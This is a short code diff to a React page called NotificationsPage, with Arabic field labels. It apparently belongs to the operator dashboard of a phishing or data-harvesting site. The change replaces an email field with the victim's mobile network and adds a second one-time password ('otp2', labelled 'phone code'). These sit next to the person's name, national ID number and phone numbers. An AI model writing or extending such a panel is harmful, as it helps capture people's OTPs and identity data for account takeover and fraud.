@@ -1755,11 +1755,13 @@ export default function NotificationsPage() {
                   { label: "الاسم", value: selectedNotification.name },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
-                    label: "البريد الإلكتروني",
-                    value: selectedNotification.email,
+                    label: "الشبكة ",
+                    value: selectedNotification.network,
                   },
                   { label: "رقم الجوال", value: selectedNotification.mobile },
                   { label: "الهاتف", value: selectedNotification.phone },
+                  { label: "رمزهاتف", value: selectedNotification.otp2 },
+
                 ].map(
                   ({ label, value }) =>
                     value && (
